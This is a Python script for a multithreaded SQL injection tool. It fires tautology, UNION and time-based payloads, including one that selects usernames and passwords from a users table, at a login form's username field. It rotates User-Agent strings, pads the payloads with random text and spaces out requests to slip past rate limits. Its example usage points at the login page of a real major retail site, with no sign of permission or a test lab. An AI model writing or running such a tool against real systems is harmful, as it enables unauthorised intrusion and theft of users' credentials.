import requests
import threading
import random
import string
import time

class SQLInjectionTool:
    def __init__(self, target_url, data_fields, success_indicator):
        self.target_url = target_url
        self.data_fields = data_fields
        self.success_indicator = success_indicator
        self.payloads = self.load_payloads()
        self.user_agents = self.load_user_agents()
        self.found_vulnerable = False
        
        
    def load_payloads(self):
        # load payloads from a file or define them here
        return[
            "' OR '1'='1' -- ",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "' OR 'x'='x' -- ",
            "' OR 1=1 -- ",
            "' OR 1=1 #",
            "' UNION SELECT NULL, NULL, NULL -- ",
            "' UNION SELECT username, password FROM users -- ",
            "' AND SLEEP(5) -- ",
            "' OR SLEEP(5) -- "
            
        ]
    def load_user_agents(self):
        # Load User-Agent strings to randomize requests
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36"
        ]
    
    def random_string(self, length=8):
        # Generate a random string for payload obfuscation
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))
    
    
    def test_payload(self, payload):
        # Randomize User-Agent for each request
        headers = {
            'User-Agent': random.choice(self.user_agents)
        }

        # Obfuscate payloads
        obfuscated_payload = f"{payload} {self.random_string()}"

        # Update the data field with the current payload
        self.data_fields['username'] = obfuscated_payload
        print(f"[+] Testing payload: {obfuscated_payload}")

        # Send the HTTP POST request
        response = requests.post(self.target_url, data=self.data_fields, headers=headers)

        # Check for the success indicator
        if self.success_indicator in response.text:
            print(f"[!!!] Vulnerable! Payload succeeded: {obfuscated_payload}")
            self.found_vulnerable = True
        else:
            print(f"[-] Failed with payload: {obfuscated_payload}")

    def run(self):
        threads = []

        for payload in self.payloads:
            if self.found_vulnerable:
                break

            # Create a new thread for each payload
            t = threading.Thread(target=self.test_payload, args=(payload,))
            threads.append(t)
            t.start()

            # Introduce a slight delay to avoid rate-limiting
            time.sleep(random.uniform(0.5, 2.0))

        # Wait for all threads to complete
        for t in threads:
            t.join()

        if not self.found_vulnerable:
            print("[+] Finished testing. No vulnerabilities found.")

# Example Usage
if __name__ == "__main__":
    # Correct the URL to include the scheme
    target_url = 'https://www.amazon.com/login.php'  # Replace with the full target URL
    data_fields = {
        'username': '',
        'password': 'any_password'  # Adjust as needed for the target form
    }
    success_indicator = "Welcome"  # Replace with the text that indicates a successful injection

    # Initialize the SQL injection tool
    sql_tool = SQLInjectionTool(target_url, data_fields, success_indicator)

    # Run the SQL injection tests
    sql_tool.run()
r